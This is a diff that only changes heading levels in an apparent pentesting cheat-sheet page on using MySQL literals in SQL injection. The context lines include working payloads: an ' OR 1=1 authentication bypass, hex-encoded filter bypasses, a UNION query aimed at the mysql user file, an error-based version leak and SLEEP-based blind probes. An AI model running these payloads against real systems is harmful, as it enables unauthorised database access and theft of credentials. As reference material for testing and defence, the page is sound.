@@ -7,11 +7,9 @@ tags: ["constants", "literals", "reference"]
 lastUpdated: 2025-03-15
 ---
 
-## Constants
-
 MySQL supports various types of constants (literals) that can be valuable in SQL injection attacks. Understanding these constants helps in crafting more effective payloads and bypassing certain filters.
 
-### Numeric Constants
+## Numeric Constants
 
 MySQL supports several formats for numeric literals:
 
@@ -25,7 +23,7 @@ MySQL supports several formats for numeric literals:
 | Binary              | `0b1111`        | Same as 15 (MySQL 5.0.3+) |
 | Boolean             | `true`, `false` | Same as 1 and 0           |
 
-### String Constants
+## String Constants
 
 String literals can be represented in several ways:
 
@@ -36,7 +34,7 @@ String literals can be represented in several ways:
 | Hex String    | `0x74657874`    | Hexadecimal representation of 'text'        |
 | Binary String | `_binary'text'` | Binary string (MySQL 8.0+)                  |
 
-### Temporal Constants
+## Temporal Constants
 
 Date and time constants:
 
@@ -47,7 +45,7 @@ Date and time constants:
 | Datetime  | `'2025-03-15 15:30:45'`           | YYYY-MM-DD HH:MM:SS format |
 | Timestamp | `TIMESTAMP '2025-03-15 15:30:45'` | ANSI SQL timestamp         |
 
-### Special Constants
+## Special Constants
 
 MySQL has several special values:
 
@@ -61,7 +59,7 @@ MySQL has several special values:
 | `CURRENT_DATE`      | Current date                                                                                                                                                                             |
 | `CURRENT_TIME`      | Current time                                                                                                                                                                             |
 
-### System Constants
+## System Constants
 
 Some important MySQL system constants:
 
@@ -76,7 +74,7 @@ Some important MySQL system constants:
 | `@@port`      | MySQL port          | `3306`                     |
 | `@@log_error` | Error log path      | `/var/log/mysql/error.log` |
 
-### Boolean Expressions
+## Boolean Expressions
 
 Boolean expressions evaluate to 1 or 0:
 
@@ -87,9 +85,9 @@ Boolean expressions evaluate to 1 or 0:
 | `NULL IS NULL`     | 1 (true)  |
 | `NULL IS NOT NULL` | 0 (false) |
 
-### Using Constants in SQL Injection
+## Using Constants in SQL Injection
 
-#### String Constants in Bypasses
+### String Constants in Bypasses
 
 ```sql
 -- Standard string
@@ -102,7 +100,7 @@ Boolean expressions evaluate to 1 or 0:
 ' OR 0x61='a' -- (a='a')
 ```
 
-#### Numeric Constants in Bypasses
+### Numeric Constants in Bypasses
 
 ```sql
 -- Boolean as number
@@ -115,9 +113,9 @@ Boolean expressions evaluate to 1 or 0:
 ' OR 4-3 -- (evaluates to 1)
 ```
 
-#### Practical Applications
+### Practical Applications
 
-##### Using Boolean Constants
+#### Using Boolean Constants
 
 ```sql
 -- Simple authentication bypass
@@ -126,7 +124,7 @@ Boolean expressions evaluate to 1 or 0:
 ' OR 1=1 -- -
 ```
 
-##### Using String Constants
+#### Using String Constants
 
 ```sql
 -- Hex-encoded bypass
@@ -136,7 +134,7 @@ Boolean expressions evaluate to 1 or 0:
 SELECT CHAR(97, 100, 109, 105, 110) -- 'admin'
 ```
 
-##### Using System Constants
+#### Using System Constants
 
 ```sql
 -- Information gathering
@@ -146,7 +144,7 @@ SELECT CHAR(97, 100, 109, 105, 110) -- 'admin'
 ' UNION SELECT CONCAT(@@datadir,'/mysql/user.MYD') -- -
 ```
 
-### Error-Based Injection with Constants
+## Error-Based Injection with Constants
 
 ```sql
 -- Using constants that cause errors
@@ -156,7 +154,7 @@ SELECT CHAR(97, 100, 109, 105, 110) -- 'admin'
 ' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- -
 ```
 
-### Constants in Time-Based Attacks
+## Constants in Time-Based Attacks
 
 ```sql
 -- Sleep only if condition is true
@@ -166,7 +164,7 @@ SELECT CHAR(97, 100, 109, 105, 110) -- 'admin'
 ' AND IF(SUBSTR(@@version,1,1)=0x35,SLEEP(5),0) -- - (checking for '5')
 ```
 
-### Limitations and Considerations
+## Limitations and Considerations
 
 1. Hex string literals are MySQL-specific and may not work in other databases
 2. Some constants like `true`/`false` are case-insensitive
